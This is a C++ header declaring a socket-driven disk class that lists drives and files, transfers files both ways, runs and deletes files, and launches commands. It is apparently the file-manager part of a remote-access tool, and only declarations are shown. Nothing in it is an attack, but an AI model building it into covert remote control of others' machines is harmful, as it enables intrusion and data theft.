#pragma once
#include "MySocket.h"
#include "Common.h"
class CDisk
{
public:
public:
	CDisk();
	~CDisk();
	void SendDrivers(SOCKET sock);
	void SendFileList(wchar_t fp[260], SOCKET sock);
	void DownFile(SOCKET sock, wchar_t DownPath[260]);
	void GetFileData(DOWNFILEDATA fi);

	void UpFile(wchar_t DownPath[260]);
	
	void RunFile(wchar_t path[260]);
    void DeleteDir(wchar_t path[260]);
	void DelFiles(FILEINFO file_info);
	void NewDir(wchar_t dirname[260]);

	BOOL CreateMyProcess(CString strCommand, DWORD &dwReturn, CString &strLog, CString strPwd, wchar_t path[260]);

private:
	CMySocket m_sock;
	CFile* m_file;
};

